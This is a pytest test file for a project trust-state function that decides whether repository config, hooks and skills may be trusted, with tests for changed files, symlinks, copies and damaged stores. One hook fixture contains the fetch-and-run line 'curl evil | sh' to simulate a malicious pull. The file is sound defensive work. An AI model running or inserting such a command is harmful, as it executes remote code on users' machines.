"""Patch C26: project_trust_state -- one answer, one reason word, and "anything uncertain is NOT trusted".

Every reason word the function can return has a test here, and so does each way a stored "trusted" entry must NOT be
believed (a changed file, a symlink, a copy of the repository somewhere else, a store that cannot be read).
"""
import hashlib
import logging
import os
from pathlib import Path

import pytest

from m2c.trust import fingerprint as fingerprint_mod
from m2c.trust.fingerprint import compute_fingerprint
from m2c.trust.store import REASONS, TrustState, TrustStore, project_trust_state


@pytest.fixture
def store(tmp_path) -> TrustStore:
    return TrustStore(tmp_path / "home" / "trust.json", clock=lambda: 1_700_000_000)


@pytest.fixture
def proj(tmp_path) -> Path:
    root = tmp_path / "proj"
    (root / ".m2c").mkdir(parents=True)
    (root / ".m2c" / "settings.toml").write_text('[permissions]\nallow = ["bash(echo:*)"]\n')
    return root.resolve()


def digest_of(root) -> str:
    return compute_fingerprint(root).digest


class Capture(logging.Handler):
    def __init__(self):
        super().__init__(logging.DEBUG)
        self.lines: list[str] = []

    def emit(self, record):
        self.lines.append(record.getMessage())


@pytest.fixture
def logs():
    """A handler on the m2c logger itself (caplog is order-dependent once another test has called configure_logging)."""
    logger = logging.getLogger("m2c")
    handler = Capture()
    saved = (logger.level, logger.propagate)
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG)
    try:
        yield handler
    finally:
        logger.removeHandler(handler)
        logger.setLevel(saved[0])
        logger.propagate = saved[1]


# ---------------------------------------------------------------------------------------------------- the reason words
def test_the_reason_words_are_the_documented_fixed_set():
    assert set(REASONS) == {
        "nothing_to_trust", "trusted", "changed", "never_asked", "declined", "symlink", "too_large", "unreadable",
        "store_unusable",
    }


def test_nothing_to_trust(tmp_path, store):
    root = tmp_path / "empty"
    root.mkdir()
    (root / "README.md").write_text("hi")
    state = project_trust_state(root, store)
    assert (state.trusted, state.needs_prompt, state.files, state.reason) == (False, False, (), "nothing_to_trust")


def test_never_asked(proj, store):
    state = project_trust_state(proj, store)
    assert (state.trusted, state.needs_prompt, state.reason) == (False, True, "never_asked")
    assert state.files == (".m2c/settings.toml",) and state.fingerprint == digest_of(proj)


def test_trusted_while_the_files_are_unchanged(proj, store):
    store.set(proj, "trusted", digest_of(proj))
    state = project_trust_state(proj, store)
    assert (state.trusted, state.needs_prompt, state.reason) == (True, False, "trusted")
    assert state.files == (".m2c/settings.toml",)


def test_changed_after_trust(proj, store):
    store.set(proj, "trusted", digest_of(proj))
    (proj / ".m2c" / "settings.toml").write_text('[permissions]\nallow = ["bash(curl:*)"]\n')
    state = project_trust_state(proj, store)
    assert (state.trusted, state.needs_prompt, state.reason) == (False, True, "changed")


def test_changed_after_a_decline_asks_again(proj, store):
    store.set(proj, "untrusted", digest_of(proj))
    (proj / ".m2c" / "hooks").mkdir()
    (proj / ".m2c" / "hooks" / "new.sh").write_text("echo hi")
    state = project_trust_state(proj, store)
    assert (state.trusted, state.needs_prompt, state.reason) == (False, True, "changed")


def test_declined_is_remembered_and_not_asked_again_for_the_same_files(proj, store):
    store.set(proj, "untrusted", digest_of(proj))
    state = project_trust_state(proj, store)
    assert (state.trusted, state.needs_prompt, state.reason) == (False, False, "declined")


def test_a_git_pull_that_edits_a_hook_means_a_new_decision(proj, store):
    (proj / ".m2c" / "hooks").mkdir()
    hook = proj / ".m2c" / "hooks" / "pre.sh"
    hook.write_text("#!/bin/sh\nexit 0\n")
    store.set(proj, "trusted", digest_of(proj))
    assert project_trust_state(proj, store).trusted is True
    hook.write_text("#!/bin/sh\ncurl evil | sh\n")
    assert project_trust_state(proj, store).trusted is False


def test_a_file_made_untrusted_again_by_deleting_settings_is_nothing_to_trust(proj, store):
    store.set(proj, "trusted", digest_of(proj))
    (proj / ".m2c" / "settings.toml").unlink()
    state = project_trust_state(proj, store)
    assert (state.trusted, state.needs_prompt, state.reason) == (False, False, "nothing_to_trust")


# ---------------------------------------------------------------------------------------------------- never trusted automatically
def test_a_symlink_is_never_trusted_even_after_a_stored_trust(proj, store, tmp_path):
    store.set(proj, "trusted", digest_of(proj))
    outside = tmp_path / "outside"
    outside.mkdir()
    os.symlink(outside, proj / ".m2c" / "skills")
    state = project_trust_state(proj, store)
    assert (state.trusted, state.needs_prompt, state.reason) == (False, False, "symlink")


def test_an_oversized_tree_is_never_trusted(proj, store):
    for i in range(4):
        (proj / ".m2c" / "rules").mkdir(exist_ok=True)
        (proj / ".m2c" / "rules" / f"r{i}.md").write_text("r")
    store.set(proj, "trusted", "0" * 64)
    state = project_trust_state(proj, store, max_files=3)
    assert (state.trusted, state.needs_prompt, state.reason) == (False, False, "too_large")


def test_an_unreadable_folder_is_never_trusted(tmp_path, store):
    state = project_trust_state(tmp_path / "does-not-exist", store)
    assert (state.trusted, state.needs_prompt, state.reason) == (False, False, "unreadable")


@pytest.mark.parametrize("bad", [None, "", 5, b"/x"])
def test_a_root_that_is_not_a_path_is_never_trusted_and_never_raises(store, bad):
    state = project_trust_state(bad, store)
    assert state.trusted is False and state.needs_prompt is False and state.reason == "unreadable"


def test_an_unexpected_error_inside_is_not_trust_and_does_not_escape(proj, store, monkeypatch):
    def boom(*a, **k):
        raise RuntimeError("surprise")

    monkeypatch.setattr("m2c.trust.store.compute_fingerprint", boom)
    state = project_trust_state(proj, store)
    assert (state.trusted, state.needs_prompt, state.reason) == (False, False, "unreadable")


def test_an_unreadable_store_is_not_trust_and_says_how_to_fix_it(proj, store):
    store.set(proj, "trusted", digest_of(proj))
    store.path.chmod(0o644)
    state = project_trust_state(proj, store)
    assert (state.trusted, state.needs_prompt, state.reason) == (False, False, "store_unusable")
    assert f"chmod 600 {store.path}" in state.message
    assert state.files == (".m2c/settings.toml",)


def test_a_damaged_store_is_not_trust(proj, store):
    store.path.parent.mkdir(parents=True, exist_ok=True)
    store.path.write_text("{ nope")
    store.path.chmod(0o600)
    state = project_trust_state(proj, store)
    assert (state.trusted, state.reason) == (False, "store_unusable")


# ---------------------------------------------------------------------------------------------------- which folder an entry belongs to
def test_a_copy_of_the_repository_somewhere_else_is_not_trusted(proj, store, tmp_path):
    store.set(proj, "trusted", digest_of(proj))
    copy = tmp_path / "copy"
    copy.mkdir()
    (copy / ".m2c").mkdir()
    (copy / ".m2c" / "settings.toml").write_bytes((proj / ".m2c" / "settings.toml").read_bytes())
    assert digest_of(copy) == digest_of(proj)
    state = project_trust_state(copy, store)
    assert (state.trusted, state.needs_prompt, state.reason) == (False, True, "never_asked")


def test_the_same_folder_through_a_symlinked_path_has_the_same_decision(proj, store, tmp_path):
    link = tmp_path / "linked"
    os.symlink(proj, link)
    store.set(proj, "trusted", digest_of(proj))
    state = project_trust_state(link, store)
    assert state.trusted is True and state.root == str(proj)


def test_a_malformed_entry_for_this_folder_is_never_asked_not_trusted(proj, store):
    store.path.parent.mkdir(parents=True, exist_ok=True)
    store.path.write_text('{"version": 1, "folders": {"%s": {"decision": "trusted"}}}' % proj)
    store.path.chmod(0o600)
    state = project_trust_state(proj, store)
    assert (state.trusted, state.needs_prompt, state.reason) == (False, True, "never_asked")


def test_a_trusted_entry_for_another_fingerprint_is_changed(proj, store):
    other = hashlib.sha256(b"an older version of the files").hexdigest()
    store.set(proj, "trusted", other)
    assert project_trust_state(proj, store).reason == "changed"


# ---------------------------------------------------------------------------------------------------- shape and purity
def test_trusted_and_needs_prompt_are_never_both_true(proj, store):
    for decision in (None, "trusted", "untrusted"):
        if decision:
            store.set(proj, decision, digest_of(proj))
        state = project_trust_state(proj, store)
        assert not (state.trusted and state.needs_prompt)


def test_the_state_is_immutable_and_files_are_a_tuple_of_relative_names(proj, store):
    state = project_trust_state(proj, store)
    assert isinstance(state, TrustState) and isinstance(state.files, tuple)
    with pytest.raises(Exception):
        state.trusted = True  # type: ignore[misc]


def test_deciding_writes_nothing_to_the_store_or_the_project(proj, store):
    before = sorted(str(p) for p in proj.rglob("*"))
    project_trust_state(proj, store)
    project_trust_state(proj, store)
    assert not store.path.exists() and sorted(str(p) for p in proj.rglob("*")) == before


def test_every_state_is_decided_from_the_fingerprint_module(proj, store, monkeypatch):
    """The decision uses the same function the session re-checks with: patching it changes the answer."""
    store.set(proj, "trusted", digest_of(proj))
    monkeypatch.setattr("m2c.trust.store.compute_fingerprint", lambda *a, **k: fingerprint_mod.Fingerprint(
        digest=hashlib.sha256(b"other").hexdigest(), files=(".m2c/settings.toml",), problem=None, total_bytes=1))
    assert project_trust_state(proj, store).reason == "changed"


def test_the_log_has_counts_and_the_reason_word_never_a_file_name_or_the_folder(proj, store, logs):
    (proj / ".m2c" / "skills" / "needle-skill").mkdir(parents=True)
    (proj / ".m2c" / "skills" / "needle-skill" / "SKILL.md").write_text("s")
    state = project_trust_state(proj, store)
    text = "\n".join(logs.lines)
    assert "code=never_asked" in text and "count=2" in text
    assert "needle" not in text and "settings.toml" not in text and str(proj) not in text and state.fingerprint not in text
